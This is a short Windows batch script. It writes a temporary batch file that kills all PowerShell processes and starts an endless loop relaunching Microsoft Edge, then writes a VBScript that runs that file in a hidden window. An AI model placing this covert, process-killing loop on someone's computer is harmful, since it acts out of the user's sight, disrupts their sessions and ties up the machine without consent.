@echo off
:start
if not exist %temp%\auto.bat goto bat
if exist %temp%\auto.bat goto start2
exit
:start2
if not exist %temp%\auto.vbs goto vbs
if exist %temp%\auto.vbs goto ok
exit



:bat
echo taskkill /f /im powershell.exe >%temp%\auto.bat
echo powershell.exe -command "for (;;){If(!(Get-Process -Name msedge -ErrorAction SilentlyContinue)){Invoke-Item 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'}}">>%temp%\auto.bat
goto start
exit


:vbs
echo Set WshShell = CreateObject("WScript.Shell") >%temp%\auto.vbs 
echo WshShell.Run """%temp%\auto.bat""", 0 >>%temp%\auto.vbs
echo Set WshShell = Nothing >>%temp%\auto.vbs
goto start2
exit



:ok
cd %temp%
auto.vbs